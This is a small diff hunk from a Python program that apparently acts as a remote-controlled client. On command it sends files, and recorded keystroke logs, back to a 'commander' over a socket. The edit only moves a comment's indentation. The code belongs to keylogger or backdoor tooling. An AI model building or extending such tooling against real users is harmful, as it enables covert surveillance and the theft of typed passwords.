@@ -117,7 +117,7 @@ if __name__ == '__main__':
                     else:
                         client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
 
-                # c) Check if data is to send recorded keystroked file(s) to commander
+# c) Check if data is to send recorded keystroked file(s) to commander
                 if data.decode() == constants.TRANSFER_KEYLOG_FILE_MSG:
                     print(constants.CLIENT_RESPONSE.format(data.decode()))
                     print(constants.GET_KEYLOG_REQUEST_MSG)
